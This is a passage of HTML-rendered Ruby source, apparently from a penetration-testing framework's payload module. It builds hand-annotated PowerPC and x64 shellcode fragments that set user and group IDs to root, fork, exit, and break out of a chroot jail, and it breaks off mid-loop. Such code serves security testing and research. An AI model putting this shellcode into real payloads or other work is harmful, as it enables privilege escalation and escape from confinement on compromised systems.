+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x38\x1f\xfe\x47</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   addi    r0,r31,-441                #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\xff\xff\x02</span><span class='tstring_end'>&quot;</span></span>       <span class='comment'>#   sc                                 #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setuid(0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x3b\xe0\x01\xff</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   li      r31,511                    #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x63\x1a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r3,r3,r3                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x38\x1f\xfe\x18</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   addi    r0,r31,-488                #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\xff\xff\x02</span><span class='tstring_end'>&quot;</span></span>       <span class='comment'>#   sc                                 #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetresgid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setresgid(0, 0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x3b\xe0\x01\xff</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   li      r31,511                    #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\xa5\x2a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r5,r5,r5                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x84\x22\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r4,r4,r4                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x63\x1a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r3,r3,r3                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x38\x1f\xfe\xab</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   addi    r0,r31,-341                #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\xff\xff\x02</span><span class='tstring_end'>&quot;</span></span>       <span class='comment'>#   sc                                 #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetregid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setregid(0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x3b\xe0\x01\xff</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   li      r31,511                    #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x84\x22\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r4,r4,r4                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x63\x1a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r3,r3,r3                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x38\x1f\xfe\x48</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   addi    r0,r31,-440                #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\xff\xff\x02</span><span class='tstring_end'>&quot;</span></span>       <span class='comment'>#   sc                                 #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetgid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setgid(0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x3b\xe0\x01\xff</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   li      r31,511                    #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x63\x1a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r3,r3,r3                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x38\x1f\xfe\x2f</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   addi    r0,r31,-465                #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\xff\xff\x02</span><span class='tstring_end'>&quot;</span></span>       <span class='comment'>#   sc                                 #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependChrootBreak</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setreuid(0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x3b\xe0\x01\xff</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   li      r31,511                    #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x84\x22\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r4,r4,r4                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x63\x1a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r3,r3,r3                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x38\x1f\xfe\x47</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   addi    r0,r31,-441                #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\xff\xff\x02</span><span class='tstring_end'>&quot;</span></span>       <span class='comment'>#   sc                                 #
+</span>
+      <span class='comment'># EEK! unsupported...
+</span>    <span class='kw'>end</span>
+
+    <span class='comment'># Append exit(0)
+</span>
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>AppendExit</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_app'>app</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x3b\xe0\x01\xff</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   li      r31,511                    #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x63\x1a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r3,r3,r3                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x38\x1f\xfe\x02</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   addi    r0,r31,-510                #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\xff\xff\x02</span><span class='tstring_end'>&quot;</span></span>       <span class='comment'>#   sc                                 #
+</span>    <span class='kw'>end</span>
+
+  <span class='kw'>elsif</span> <span class='lparen'>(</span><span class='id identifier rubyid_test_arch'>test_arch</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='const'>ARCH_X64</span><span class='rparen'>)</span><span class='rparen'>)</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependFork</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># if (fork()) { exit(0); }
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x39</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    57        ; __NR_fork     #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x85\xc0</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    test    rax,rax                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x74\x08</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    jz      0x08                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xff</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x3c</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    60        ; __NR_exit     #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetresuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setresuid(0, 0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xff</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xfe</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rsi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x75</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x75                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetreuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setreuid(0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xff</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xfe</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rsi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xf2</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rdx,rsi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x71</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x71                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setuid(0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xff</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x69</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x69                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetresgid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setresgid(0, 0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xff</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xfe</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rsi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x77</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x77                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetregid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setregid(0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xff</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xfe</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rsi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xf2</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rdx,rsi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x72</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x72                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetgid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setgid(0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xff</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x6a</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x6a                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependChrootBreak</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+
+      <span class='comment'># setreuid(0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xff</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xfe</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rsi,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xf8</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rax,rdi                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xb0\x71</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    mov     al,0x71                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>
+      <span class='comment'># generate temp dir name
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\xbf</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    mov     rdi,                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>8</span><span class='rparen'>)</span>  <span class='comment'>#         random                #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x56</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    push    rsi                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x57</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    push    rdi                       #
+</span>
+      <span class='comment'># mkdir(random,0755)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xe7</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rdi,rsp                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x66\xbe\xed\x01</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    mov     si,0755                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x53</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x53                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>
+      <span class='comment'># chroot(random)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xd2</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdx,rdx                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xb2\xa1</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    mov     dl,0xa1                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xd0</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rax,rdx                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>
+      <span class='comment'># build .. (ptr in rdi )
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x66\xbe\x2e\x2e</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    mov     si,0x2e2e                 #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x56</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    push    rsi                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xe7</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rdi,rsp                   #
+</span>
+      <span class='comment'># loop chdir(..) 69 times
+</span>      <span class='comment'># syscall tend to modify rcx can&#39;t use loop...
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x45</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x45                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5b</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rbx                       #
